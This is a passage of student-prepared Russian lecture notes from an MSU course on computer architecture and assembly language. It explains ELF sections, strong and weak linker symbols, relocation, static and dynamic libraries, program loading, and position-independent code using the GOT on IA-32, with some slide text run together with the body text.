      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
мат ELF файла (продолжение)
           Архитектура ЭВМ и язык ассемблера                            КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                            ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
           Падарян Вартан Андроникович                                  СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU


b
волов                                                                          0
                                                    Заголовок ELF
 ий и статических переменных
й                                            Таблица заголовков сегментов
                                              (необходима в исп. файлах)
ext
перемещения ссылок в секции                          секция .text
                                                    секция .rodata
вляемых операндов в
де инструкций                                        секция .data
ata                                                  секция .bss
перемещения ссылок в секции
                                                    секция .symtab
льных переменных,
ованных ссылками на                                 секция .rel.txt
кции или глобальные
                                                   секция .rel.data
                                                    секция .debug
 имвольного отладчика
                                              Таблица заголовков секций
вков секций                                                            18
размеры каждой секции                        Рис. 17.4: Структура ELF файла.

              • Секция .rodata содержит данные, доступные только для чтения. Традиционно
                помещается недалеко от секции .text, потому что и одно и другое не должны быть
                доступны на запись при работе программы.

              • Секция .symtab - это таблица символов.

              • Несколько секций с префиксом .rel. Такой префикс означает relocation (то есть
                ссылки). С помощью суффикса указывается к чему эти ссылки относятся. В секции
                .bss очевидно relocation быть не может.

              • Кроме того, может быть ещё что угодно. Например отладочная информация (.debug).

           Символы в процессе компоновки

              В процессе компоновки ведётся работа с символами трёх типов.

              1. Глобальные символы. Это символы, соотносящиеся с глобальными функциями
                 или переменными. Они должны быть видны из других модулей. Функция main в
                 рассмотренном ранее примере является глобальным символом.

              2. Внешние (неопределённые) символы. Это то, к чему происходит обращение в
                 рамках единицы трансляции, но не определено. То есть, символы используются, но


                                                          189
                 ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
                 МАТЕМАТИКИ И КИБЕРНЕТИКИ
                 МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                  КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                       ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                        СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




     определены где-то в другом месте. Функция swap в рассмотренном ранее примере
     является внешним символом.

  3. Локальные символы. Аналогично глобальным символам, только в данном случае
     они не должны быть видны из других модулей.Важный момент состоит в том, что
     локальные символы не являются локальными переменными Си-программ.




                                      190
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                    КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                         ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                          СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Лекция 18. Сборка Си-программы
Предварительное определение переменных
   Когда что-то определяется, это требует выделения в памяти (в статической памяти),
то есть заводится некоторое пространство внутри секции со статическими данными и
на это пространство можно потом сослаться через то символьное имя, через ту метку,
которое было назначено. Но в языке С есть одна особенность, связанная с тем, как
этот язык позволяет определять, объявлять переменные. Выглядит это следующим
образом: в отдельной единице трансляции, которую вы разрабатываете, пишете, может
быть, скажем так, предварительное определение, которое будет оставаться таким до тех
пор, пока компилятор не дойдёт в процессе своей работы до конца файла с исходным
кодом. Возможно, это дополнительное определение будет потом дополнено другими
объявлениями (определениями), главное, чтобы ему не противоречили. Вы столкнётесь,
уже выполняя функции компилятора, с тем, что у Вас будут инициализированные
данные. Но, возможно, все как раз и ограничится предварительным определением,
которое в результате потребует, чтобы в единице трансляции как бы присутствовала
переменная с нулевым значением. Здесь мы рассматриваем несколько таких переменных,
для которых введены предварительные определения. Когда мы говорили о том, что
помимо предварительного может быть несколько других определений, главное, чтобы
при этом не возникало конфликтов по тому, как переменная видна снаружи, а именно по
связыванию имён.

   • Внутренним, оно задаётся в языке С с помощью спецификатора static. Таким
     образом, если всплывает дополнительное определение, то главное потом не
     противоречить тому, какое связывание Вы изначально ему назначили.

   • Если это локальная для модуля переменная, то ничего страшного, но проблемы
     могут возникать в том случае, если у Вас в разных модулях встречаются
     предварительные определения одной и той же переменной с внешним связыванием,
     то есть глобальных переменных и у которых одинаковые имена. Это будет
     приводить к тому, что Вы столкнётесь с потенциальной проблемой в каждом
     модуле, в каждой единице трансляции может быть выделена память под эту
     переменную, и тогда возникает вопрос, а на кого правильно ссылаться.


Сильные и слабые символы. Пример.
   Для того, чтобы разобраться с неопределённостью “а на кого правильно ссылаться в
данной ситуации?”, на уровне компоновщика есть механизм сильных и слабых символов.
Если упрощённо на него посмотреть, то каждый символ в программе может быть либо
сильным, либо слабым.



                                        191
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                     КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                          ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                           СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




   • К сильным символам относятся все функции и инициализированные глобальные
     переменные, если только с помощью специальных возможностей не было
     специально назначено, что функция или переменная потом должна превратиться в
                                                                © 2021 МГУ/ВМК/СП

     слабый символ.
                                        Сильные и слабые символы
   • Слабыми символами будут оказываться все неинициализированные глобальные
     переменные. Таким образом, в модуле p1.c (рисунок 18.1) переменная foo будет
             • Каждый символ в программе либо «сильный», либо
     порождать сильный
                «слабый»символ, потому что она инициализирована, равно как и сама
     функция p1. В
                 – модуле
                   Сильные:p2.c это же
                            функции    имя переменной будет
                                    и инициализированные       порождать
                                                         глобальные       слабый символ,
                                                                    переменные
                 – Слабые: неинициализированные  глобальные переменные
     потому что переменная не инициализирована (функция по-прежнему сильная).

                                          p1.c               p2.c
                           сильный        int foo=5;         int foo;              слабый

                           сильный        p1() {             p2() {                сильный
                                          }                  }


                                  Рис. 18.1: Пример сильных и слабых символов.


                                                                                                3
Правила работы с символами
  1. Одинаковые сильные символы запрещены. Одинаковые символьные символы
     запрещены, потому что в этом случае мы будем сразу приходить к некоторому
     конфликту. Например, в двух разных единицах трансляции объявлены функции с
     одинаковыми именами, возникает конфликт. И если встретятся сильные символы с
     одинаковыми именами, будет ошибка компоновки.

  2. Один сильный символ и несколько слабых – выбираем сильный символ. Если в
     процессе компоновки есть один сильный символ и несколько слабых, то слабые
     символы не используются (про них фактически забывают), и все ссылки будут
     соотноситься с этим единственным сильным символом, и пересчёты ссылок как раз
     должны будут приводить на сильный символ.

  3. Если несколько слабых символов, выбираем произвольный. Если встретилось
     несколько слабых символов и ни одного сильного, тогда будет выбран некоторых
     произвольный символ (по каким правилам – неизвестно, особенности реализации).
     Компоновщик сам выбирает этот символ и все ссылки будут заведены именно на
     него. В тех опциях, которые использует компилятор по умолчанию, такое поведение
     может быть изменено дополнительным ключом, который позволяет завести т.н.
     общие символы. Эту опцию можно включать, либо выключать (gcc -fno-common).




                                                       192
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                       КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                            ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                             СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Задача. Ошибка компоновки
   Возможна ситуация, в которой произойдёт коллизия между слабыми символами или
даже сильными. Рассмотрим случаи:

   • Ошибка компоновки: два сильных символа. Возникает, если есть две одинаковых
     функции с одинаковыми именами.

   • Различные функции с разными именами, но два слабых одинаковых символа.
     Например 𝑖𝑛𝑡𝑥; в двух файлах, ссылки будут ссылаться на один и тот же
     неинициализированный int, но непонятно на какой. Программа останется
     работоспособной, но произойдёт перерасход памяти на 4 байта.

   • Типы переменных с одинаковыми именами различаются. То есть в одном файле
     будет int x; и int y; а в другом double x. Могут возникать неприятные ошибки. Если
     будет производиться запись в переменную double, то возможно изменение памяти
     (переменной y), которая находится далее за переменной int x из-за того, что размер
     типов разный.

   • Если в предыдущем случае int x=7; например, то есть x - сильный символ, то
     описанная перезапись произойдёт гарантированно, так как слабый символ (double
     x) будет гарантированно отброшен. В этом случае ошибка будет стабильно
     проявляться.

   • Все ссылки на x будут ссылаться на один инициализированный int x, если в одном
     файле он инициализирован, а в другом - нет.

Наихудшим сценарием может быть такая ситуация, когда компилируются две одинаково
слабые структуры, но с разными правилами выравнивания (разными компиляторами
откомпилированные). В результате получится ситуация, в которой обращения к одним
полям будут портить значения других и так далее.
   Чтобы избегать таких ошибок необходимо следовать некоторым правилам.

   • Избегать необоснованного использования глобальных переменных.

   • В противном случае рекомендуется использовать ключевое слово static, чтобы
     ограничивать область видимости, и не позволять из разных модулей (файлов)
     обращаться к одному и тому же месту в памяти разными способами.

   • Инициализировать глобальную переменную, если всё же приходиться её объявлять.


Пример (Правила перебазирования)
   Пример состоит из двух модулей: hello1.c и hello2.c. Код hello1.c:


                                          193
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
     Архитектура ЭВМ и язык ассемблера                                                     КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                                               ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
     Падарян Вартан Андроникович                                                           СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




     extern void func ();
     char * buf = " Hello , world ! \n";
     int main () {
              int ret_code = 0;
              func ();
              return ret_code ;
     }
        Код hello2.c:
     # include <stdio .h>

     extern char * buf ;
                                                                       © 2021 МГУ/ВМК/СП


extern void func();                      #include <stdio.h>          hello2.c
    void func () hello1.c {
char *buf = "Hello, world!\n"; extern char* buf;
                 printf ("%s",       buf );
int }
    main() {                   void func() {
  int ret_code = 0;               printf("%s", buf);
    func();                     }
    returnСама   программа собирается из двух отдельно скомпилированных .o - файлов (схема
           ret_code;
}
     на рисунке 18.2).
all: hello
                                                     hello1.c         hello2.c
hello: hello1.o hello2.o

                                                    Трансляторы      Трансляторы
hello1.o: hello1.c                                  (cpp, cc1, as)   (cpp, cc1, as)
   gcc -c -o hello1.o hello1.c

hello2.o: hello2.c                                   hello1.o          hello2.o
   gcc -c -o hello2.o hello2.c
                                                         Компоновщик (ld)
clean:
   rm -f hello hello1.o hello2.o
                                                               hello


              Рис. 18.2: Схема компиляции и компоновки программы из двух .c - файлов.

        После того, как получили перемещаемый код, можно убедиться, что в нём
     присутствуют следующие символы:

        • Будет объявлена переменная - указатель с именем buf на строчку Hello world!,
          которая размещена в секции rodata.

        • Функция func, которая является внешней. Это означает, что, когда мы столкнёмся
          в ассемблерном коде с командой call func, то это приведёт к построению описания
          неопределённого символа.

        • Символ, связанный с кодом (с секцией текста) - это main.

     На самом деле в .o - файле присутствует больше символом, чем показывает утилита nm.
     Чтобы посмотреть, что там размещено в полном объёме, следует использовать утилиту


                                                               194
             ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
             МАТЕМАТИКИ И КИБЕРНЕТИКИ
             МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                     КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                          ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                           СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




readelf. Помимо перечисленных символов, присутствует набор служебных символов. Их
тип не связан с кодом или данным, он связан с началом секции или с именем файла.
    Кроме того, можно посмотреть какие ссылки внутри этого перемещаемого кода
присутствуют.
    Посмотрим, что происходит внутри функции main в этом простом примере. Для
этого используем утилиту objdump. Будет видно, что ссылки, которые подвергаются
перебазированию полностью соответствуют информации, полученной через утилиту
readelf. По смещению 12 обнаруживается ссылка. В секции .data можно обнаружить
место, которое зарезервировано под переменную buf.
    Для второго модуля аналогично имеется три символа, которые видны с помощью
утилиты nm.

   • Символ buf в данном случае будет иметь тип undefined.

   • Будет определена функция func (секция текст).

   • Функция printf библиотечная и тоже окажется und efined.

    С ссылками в этом модуле будет немного другая картина. Первая ссылка по
смещению +8 будет обращаться к внешней переменной buf (потому что buf здесь
выступает в качестве одного из аргументов). Дальше происходит обращение к строке,
которая находится в .rodata. Третья ссылка - это обращение к библиотечной функции
prinntf. Итого три ссылки, которые подлежат перебазированию.
    Теперь можно произвести связывание символов. Символы buf и func оказались
связанными. В первом модуле buf определён, а во втором используется. Символ
func, наоборот, определён во втором модуле, а используется в первом. Символ printf из
стандартной библиотеки, он находится в отдельном .o - файле, который будет участвовать
в компоновке.
    Кроме того, необходимо знать, по каким адресам размещены все эти данные и
функции. Узнать это можно передав специальный ключ компоновщику (-XLinker).
    Вся информация о базовых адресах и ссылках позволяет сразу произвести перерасчёт
значений ссылок. Существует два типа преобразования:

   • Тип перебазирования 𝑅_386_32. При обращении к статическим данным в секции
     .rodata новое значение ссылки - это сумма абсолютного адреса (S) и добавки (A -
     addend), которая размещена непосредственно в байтах ссылки.

   • Тип перебазирования 𝑅_386_𝑃𝐶32. Здесь считается расстояние между местом, куда
     ссылаемся от текущего места размещения ссылки. Тогда новое значение ссылки - то
     S - P + A, где P - абсолютный адрес ссылки.




                                         195
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                               КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                                    ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                                     СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Работа с общими функциями
    Существует вопрос о размещении общих функций. Как следует располагать те, что
часто используются разными программами? Примеры таких функций - это математика,
I/O, управление памятью, работа со строками и так далее. Имея рассмотренный порядок
компоновки, можно поступить разными способами:

  1. Поместить все функции в один файл (например все функции, связанные с
     математикой). С одной стороны, это просто, с другой стороны, неэффективно,
     потому что это означает затягивание всех функций, а не только тех, которые
     нужны.

  2. Поместить каждую функцию в отдельный файл. Этот вариант более эффективен, но
     это неудобно, потому что придётся отслеживать, что используется, какие функции
     нужны. Для того, чтобы с этим бороться, придумали статические библиотеки.


Статические библиотеки
   Статические библиотеки - это фактически архив, куда помещены близкие по
смыслу и функциональности файлы, реализующие различные функции. В момент
сборки программы указывается набор архивов, чтобы компоновщик из них вытащил
нехватающие объектные файлы и полностью дополнил код, участвующий в статической
компоновке. Если в архиве найдётся файл, позволяющий определить символ, то его
автоматически включают в компоновку.
   Библиотека создаётся отдельной программой (библиотекарем), которая собирает
транслированные в расширение .o - файлы в один большой .a - файл. Примером является                       © 2021 МГУ/ВМК/СП



стандартная библиотека Си libc.a, она содержит более 1000 объектов. Схематически
                                 Создание статической библиотеки
процесс представлен на рисунке 18.3.
                                             atoi.c      printf.c            random.c

                                            Транслятор   Транслятор    ...   Транслятор


                                              atoi.o     printf.o            random.o


                                                         Библиотекарь (ar)


                                                           libc.a

                                  Рис. 18.3: Схема создания статической библиотеки.
                                            Библиотекарь позволяет выполнять инкрементальное обновление
                                            Повторная компиляция функции и замена соответствующего o-файла в
                                             библиотеке.                                                   25

Использование статических библиотек

   Для разрешения внешних ссылок в итоге компоновщик имеет следующий алгоритм:


                                                              196
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                                                         КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                                                              ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                                                               СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




   • Просматривает командную строку, с которой запущен, смотрит ключи порядке их
     следования.

   • В порядке просмотра формирует список неразрешённых символов.

   • Как только появляется новый объектный файл, компоновщик пытается сопоставить
     символы с тем, что находит в объектном файле. Если попадается ключ с именем
     библиотеки, то компоновщик пытается вытащить из неё все необходимые .o -
     файлы.

   • Если остался хоть один неразрешённый символ по окончании просмотра, то
     появляется ошибка линковки.

   Получается, что порядок следования опций в командной строке важен. Следует
указывать библиотеки последними.


Загрузка исполняемого объектного файла
   После того, как прошла статическая компоновка, необходимо выполнить загрузку.
Загрузчик выполняет эту задачу.

   • Сначала он подготавливает адресное пространство для запускаемых программ.

   • Затем происходит копирование соответствующих секций в диапазоны адресов
     памяти.

   • В конце передаётся управление на точку входа программы. Адрес, считающийся
     точкой входа записан в заголовке .l - файла. Традиционно - это символ _𝑠𝑡𝑎𝑟𝑡.                                    © 2021 МГУ/ВМК/СП




                                        Загрузка исполняемого объектного файла
                                  Исполняемый объектный файл
                                                                 0                         Память ядра ОС
                                         ELF заголовок               0x80000000
                                                                                        Пользовательский стек
                                  Таблица заголовков сегментов                                                        esp
                                                                                                                      (указатель
                                             .init                                                                    стека)
                                             .text                                    Область для динамических
                                           .rodata                                            библиотек
                                                                      0x0f7e9ddc
                                             .data
                                             .bss                                                                      brk
                                           .symtab                                              «Куча»
                                                                                               (malloc)
                                            .debug
                                                                                        Сегмент чтение/запись        Загружены из
                                             .line                                                                   исполняемого
                                                                                           (.data, .bss, ...)        файла
                                           .strtab                                    Сегмент чтение/выполнение
                                                                                      (.init, .text, .rodata, ...)
                                   Таблица заголовков секций         0x08048000
                                                                                            Не используется
                                                                                  0


                      Рис. 18.4: Фрейм при загрузке исполняемого объектного файла.




                                                                            197
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                    КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                         ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                          СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




   Для каждого сегмента внутри диапазона адресов заводится описатель, который
регламентирует, как пространство памяти должно подготавливаться. В составе описателя
есть указания, начиная с какого смещения из файла нужно копировать в память, в
каком базовом адресе этот диапазон начинается, количество байт, которые нужно в
этот диапазон адресов отправить, величина выравнивания, атрибуты доступа сегмента
адресов.
   Схема того, как будет выглядеть память, представлена на рисунке 18.4.




                                        198
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                   КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                        ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                         СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Лекция 19. Динамические библиотеки. Динамическое
связывание
Динамические библиотеки
   Вопросы, которые решают статические библиотеки не решаются в полной мере.
Остаются такие проблемы, как:

   • Многократное копирование одного и того же кода при построении совсем разных
     исполняемых файлов. Например стандартная библиотека языка Си нужна всем
     программам (на Си).

   • Копии кода в исполняемых файлах

   • Самая острая проблема состоит в том, что в системных библиотеках существуют
     ошибки. Если таковая находится, то получается, что все разработчики должны
     не только перекомпилировать программы, но и обеспечить распространение
     своих обновлений после полной пересборки. Хотелось бы, чтобы исправления в
     библиотеках “подцеплялось” само в момент запуска программы.

    Отметим, что размер кода вырастает на порядок при компиляции исключительно
на статических библиотеках (не всегда этот эффект сильный, заметно на маленьких
программах преимущественно).
    Динамические библиотеки позволяют собирать окончательно программы во время
запуска или уже во время работы. В linux динамические библиотеки имеют расширения
.so (сокращение от shared object), в windows .dll (dynamic library).
    Динамическая компоновка происходит с помощью ещё одной сущности -
динамического компоновщика. В linux динамический компоновщик - это ld-linux.so.
Это специальная программа, которая будет отрабатывать до того, как ваша программа
начинает работать. То есть, в момент, когда управление ещё не передано на точку
входа, но программа уже загружена в память. Кроме того, динамическая компоновка
может происходить даже тогда, когда программа уже работает. Так как динамический
загрузчик остаётся на всё время в адресном пространстве работающего приложения, то
ничего не мешает обращаться к нему во время работы программы через специальные
библиотечные функции.
    Таким образом, подключается заголовочный файл dlfcn.h для работы с
динамическими библиотеками, и используется функция dlopen для открытия файла
динамической библиотеки. Фрагмент кода:
# include <dlfcn .h>
void * dlopen ( const char * filename , int flag );
   Проблемы при использовании динамических библиотек:


                                       199
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                      КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                           ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                            СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




   • Динамическая компоновка не позволяет заранее распределить команды и данные
     динамических библиотек на какие-то заранее определённые адреса. Таким образом,
     придётся строить позиционно-независимый код.

   • Появляются вопросы передачи управления, так как для этого необходимо знать
     расстояние до точки, куда необходимо передать управление. То есть, до момента
     компоновки неизвестно куда ведут ссылки.

   • Аналогичная проблема может возникнуть с кодом самой динамической библиотеки.
     Она может работать не только с собственными функциями, из неё могут
     происходить какие-то переходы в код самой программы или в код других
     динамических библиотек.


Пример
   В качестве иллюстрации рассмотрим пример Hello world. Состоит программа из двух
модулей Первый модуль (единица трансляции) - это hello.c, второй - hello2.c.
   hello.h:
extern void f ();

extern char * buf ;
   hello.c:
# include " hello .h"
char * buf = " Hello , n";
int main () {
         int ret_code = 0;
         f ();
         return ret_code ;
}
   hello2.c:
# include <stdio .h>
# include " hello .h"

void f() {
        printf ("%s", buf );
}
    Первый файл (hello.c) со временем превратиться в программу hello.dlib, а второй
(hello2.c) превратится в динамическую библиотеку libhello.so. Видно, что у динамических
библиотек появляется префикс и суффикс (расширение).


                                         200
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                        КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                             ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                              СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




    Сборка несколько усложняется. Строится 32-х разрядный код, для компактности
кода можно отключить его защиту. Из файла hello2.c строится ассемблерный листинг,
для того, чтобы получился код, не зависящий от позиции, применяется принудительно
ключ -fPIC. Далее ассемблерный код превращается в перемещаемый объектный код.
Затем происходит статическая компоновка с получением динамической библиотеки.
Важный момент заключается в том, что, когда происходит статическая компоновка .o -
файла первого модуля (hello.o), необходимо указать , помимо .o - файла ещё libhello.so -
shared object. Это делается для того, чтобы в процессе статической компоновки можно
было оставить ссылки на следующий этап, подсмотрев, что экспортирует динамическая
библиотека.
    Полный процесс динамической компоновки времени загрузки схематично изображён
на рисунке 19.1.

                                  hello1.c   hello.h    hello2.c     hello.h


                                       Трансляторы           Трансляторы
                                      (cpp, cc1, as)        (cpp, cc1, as)


                                        hello1.o            hello2_pic.o


                                     Компоновщик (ld)      Компоновщик (ld)


                                      hello-dlib               libhello.so, libc.so, …



                                      Загрузчик ОС
                                        (execve)




                                       Динамический компоновщик
                                                                                                       6
                                            (ld-linux.so)


                     Рис. 19.1: Процесс динамической компоновки времени загрузки.



Позиционно независимый код в IA-32
   При построении позиционно независимого кода возникает проблема. В этой
архитектуре на уровне набора команд недоступно сразу адресоваться относительно
текущего положения счётчика команд. Приходится пользоваться тем, что при построении
этого модуля (исполняемый файл или динамическая библиотека) вспомогательную
таблицу с указателями поместят на известном смещении. Это смещение откроет доступ к


                                                         201
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                     КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                          ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                           СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




таблице указателей, а за правильное выставление значений в таблице GOT (Global Offset
Table) отвечает уже динамический компоновщик.
   С помощью GOT можно уже адресоваться на внешние функции и переменные.
   Рассмотрим этапы построения GOT.

   • На начальном этапе имеется код на Си, который компилятор превращает в
     ассемблерный код. В ассемблерном листинге появляются особые конструкции -
     ключевые слова (@_𝐺 𝐿𝑂𝐵𝐴𝐿_𝑂𝐹𝐹𝑆𝐸𝑇_𝑇 𝐴𝐵𝐿𝐸_, @𝐺𝑂𝑇, @𝐺𝑂𝑇𝑂𝐹𝐹, @𝑃𝐿𝑇).
     Ассемблер будет строить ссылки определённых типов, отличных от ранее
     рассмотренных типов ссылок. Это необходимо для построения перемещаемого
     объектного кода.

   • Рассматривается функция f из файла hello2.c. Из этой функции вызывалась
     функция printf, которая печатала строчку, расположенную где-то за пределами
     модуля. В начале необходимо разобраться, на каких адресах располагается
     глобальная таблица смещений. После надо будет обратиться к переменной (в
     которой содержится строка), определив её адрес, который находится где-то в
     другом модуле. Затем необходимо будет обратиться к своей собственной строке,
     которая размещена в этом же модуле, где и выполняется текущий код. Необходимо
     заложить механизм пересчёта в абсолютные адреса для дальнейшего определения
     адреса строчки, которая будет печататься. В конце необходимо будет обратиться к
     библиотечной функции printf, которая также находится в другом месте.

   • Ассемблер сформировал ссылки. Необходимо теперь обратиться к данным, но
     текущий абсолютный адрес изначально неизвестен. Для того, чтобы решить
     данную проблему, необходимо вспомнить, что в архитектуре IA-32 при вызове
     какой-либо функции, на стек кладётся адрес следующей команды. Таким образом,
     можно вызвать функцию, которая снимет то, что лежит в верхушке стека (адрес
     возврата) и поместит его в регистр ebx:
     _x86.get_pc_thunk.bx :
             mov     ebx , dword [esp]
             ret

     Этот регистр в случае позиционно-независимого кода играет важную роль. В нём
     хранится якорный адрес, связанный с глобальной таблицей смещения.

   Рассмотрим для примера кусок памяти. Где-то в памяти находится команда, с
помощью которой будет определяться расстояние до глобальной таблицы смещений.
Первый байт - это 81, затем C3, затем идёт значение ссылки, которое необходимо будет
пересчитать в процессе компоновки. Вспомогательная функция поместит в ebx адрес
возврата, таким образом, ebx будет указывать на начало и содержать абсолютный адрес.



                                        202
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                          КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                               ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                                СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Далее, расстояние до GOT от ebx известно (пусть равно некоему Δ). Кроме того, известна
позиция ссылки, которую необходимо пересчитать. Таким образом, если сместить
текущее значение ebx на Δ, то получается абсолютный адрес глобальной таблицы
смещений.

                                                Δ = 2 + ( 𝜒𝐺𝑂𝑇 − 𝜒𝑙𝑖𝑛𝑘 )                                       (19.1)

   Двойка появляется, так как в начале стоят два байта. Адреса таблицы GOT и
ссылки - это соответственно 𝜒𝐺𝑂𝑇 и 𝜒𝑙𝑖𝑛𝑘 . Схематичное изображение фрагмента памяти
представлено на рисунке 19.2.
                                       ссылка
            ebx                                                                                 GOT
                                                        Δ

